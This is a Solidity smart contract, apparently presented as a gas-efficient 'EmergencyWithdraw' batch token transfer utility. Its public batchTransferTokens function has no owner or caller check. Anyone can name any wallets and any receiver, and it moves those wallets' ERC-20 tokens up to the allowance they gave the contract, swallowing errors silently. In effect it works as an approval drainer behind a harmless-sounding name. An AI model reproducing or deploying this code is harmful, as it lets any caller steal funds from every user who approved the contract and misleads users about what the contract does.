// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.8.0/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.8.0/contracts/security/ReentrancyGuard.sol";

/**
 * @title EmergencyWithdraw
 * @dev Gas-efficient batch token transfer contract that uses minimal storage operations
 * and optimized data structures for lower gas consumption
 */
contract EmergencyWithdraw is ReentrancyGuard {
    // Events
    event BatchTransfersCompleted(
        uint256 totalTransfers, 
        uint256 successfulTransfers
    );
    
    event TokenTransferred(
        address indexed wallet,
        address indexed token,
        address indexed receiver,
        uint256 amount
    );
    
    /**
     * @notice Performs gas-efficient batch transfers of tokens from multiple wallets
     * @param wallets Array of wallet addresses to transfer from
     * @param tokens Array of token addresses corresponding to each wallet
     * @param receiver Address to receive all tokens
     * @return successCount Number of successful transfers
     */
    function batchTransferTokens(
        address[] calldata wallets,
        address[][] calldata tokens,
        address receiver
    ) external nonReentrant returns (uint256 successCount) {
        require(wallets.length > 0, "No wallets specified");
        require(receiver != address(0), "Invalid receiver");
        
        uint256 totalTransfers = 0;
        successCount = 0;
        
        // Process transfers without storing unnecessary state
        for (uint256 i = 0; i < wallets.length; i++) {
            address wallet = wallets[i];
            address[] calldata walletTokens = tokens[i];
            
            require(walletTokens.length > 0, "Wallet has no tokens specified");
            totalTransfers += walletTokens.length;
            
            for (uint256 j = 0; j < walletTokens.length; j++) {
                address tokenAddress = walletTokens[j];
                if (tokenAddress == address(0)) continue;
                
                // Try to transfer token with minimal operations
                if (_safeTransferToken(wallet, tokenAddress, receiver)) {
                    successCount++;
                }
            }
        }
        
        emit BatchTransfersCompleted(totalTransfers, successCount);
        return successCount;
    }
    
    /**
     * @dev Safely transfers a token with minimal gas usage
     * @param wallet Wallet to transfer from
     * @param tokenAddress Token address to transfer
     * @param receiver Receiver address
     * @return success Whether the transfer succeeded
     */
    function _safeTransferToken(
        address wallet,
        address tokenAddress,
        address receiver
    ) private returns (bool success) {
        try IERC20(tokenAddress).balanceOf(wallet) returns (uint256 balance) {
            if (balance == 0) return false;
            
            try IERC20(tokenAddress).allowance(wallet, address(this)) returns (uint256 allowance) {
                if (allowance == 0) return false;
                
                uint256 transferAmount = allowance < balance ? allowance : balance;
                
                try IERC20(tokenAddress).transferFrom(wallet, receiver, transferAmount) returns (bool result) {
                    if (result) {
                        emit TokenTransferred(wallet, tokenAddress, receiver, transferAmount);
                        return true;
                    }
                } catch {}
            } catch {}
        } catch {}
        
        return false;
    }
}
